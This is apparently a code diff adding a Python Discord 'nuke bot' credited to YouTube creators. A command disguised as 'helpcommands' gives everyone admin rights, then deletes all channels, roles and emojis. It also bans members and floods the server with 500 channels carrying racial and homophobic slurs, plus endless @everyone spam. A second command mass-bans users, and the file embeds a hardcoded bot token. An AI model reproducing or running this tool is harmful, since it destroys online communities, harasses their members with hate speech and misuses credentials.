@@ -1,0 +1,111 @@
+import discord
+from discord.ext import commands
+import random
+from discord import Permissions
+from colorama import Fore, Style
+import asyncio
+
+token = "ODYyNTU1MjMyNzQ3NzgyMTU0.YOaDKA.FyNcWziBEVL-cLH0JyJg_9_Ul88"
+
+
+SPAM_CHANNEL =  ["NUKED BY COSMO" , "GET NUKED FAGGOTS" , "imagine getting nuked" , "get beamed","failed abortions","adopted niggers ","gachafags","nuked by Cosmo","fucking niggers","Get on my level" , "Cosmo owns you","idiots","failed abortions","fuck off","gachatards","FUCK GACHA","stupid niggers","NOOKED","gacha niggers","urban tracker"," nigger","useless","pathetic","gachafuckingtards"]
+SPAM_MESSAGE = ["@everyone https://youtube.com/channel/UC5kanCBpnTRtcxrWs8QvZ0w https://discord.gg/xk7tBFK4Nz, COSMO OWNS YOU ALL YOU FUCKING STUPID FAGGOT NIGGERS GO DIE IN A HOLE GACHAFAGS SKINNY FUCKWITS!!!! UNEDUCATED NIGGERS https://cdn.discordapp.com/attachments/820941033859973160/862865745964564500/video0.mp4"]
+
+client = commands.Bot(command_prefix="?") 
+
+print("?helpcommands - nuke")
+print("?bruh - ban all members")
+print("?stop - stop the nuke,why would you stop tho")
+print("Credits to White Code and Astrotrek on youtube")
+
+
+@client.event
+async def on_ready():
+   print(''' 
+   
+███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
+████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝ 
+██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░ 
+██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░ 
+██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░  
+╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░ 
+ J
+ ''')
+   await client.change_presence(activity=discord.Game(name="Credits to WhiteCodex"))
+
+@client.command()
+@commands.is_owner()
+async def stop(ctx):
+    await ctx.bot.logout()
+    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)
+
+@client.command()
+async def helpcommands(ctx):
+    await ctx.message.delete()
+    guild = ctx.guild
+    try:
+      role = discord.utils.get(guild.roles, name = "@everyone")
+      await role.edit(permissions = Permissions.all())
+      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
+    except:
+      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
+    for channel in guild.channels:
+      try:
+        await channel.delete()
+        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
+      except:
+        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
+    for member in guild.members:
+     try:
+       await member.ban()
+       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
+     except:
+       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
+    for role in guild.roles:
+     try:
+       await role.delete()
+       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
+     except:
+       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
+    for emoji in list(ctx.guild.emojis):
+     try:
+       await emoji.delete()
+       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
+     except:
+       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
+    banned_users = await guild.bans()
+    for ban_entry in banned_users:
+      user = ban_entry.user
+      try:
+        await user.unban("urban tracker#9043")
+        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
+      except:
+        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
+    await guild.create_text_channel("NUKED BY COSMO")
+    for channel in guild.text_channels:
+        link = await channel.create_invite(max_age = 0, max_uses = 0)
+        print(f"New Invite: {link}")
+    amount = 500
+    for i in range(amount):
+       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+    print(f"Nuked {guild.name} Successfully.")
+    return
+
+@client.command(pass_context=True)
+async def bruh(ctx): 
+    await ctx.message.delete()
+    guild = ctx.message.guild
+    for member in list(client.get_all_members()):
+        try:
+            await guild.ban(member)
+            print ("User " + member.name + " has been banned")
+        except:
+            pass
+    print ("Action completed: Ban all")
+
+@client.event
+async def on_guild_channel_create(channel):
+  while True:
+    await channel.send(random.choice(SPAM_MESSAGE))
+
+client.run(token, bot=True)
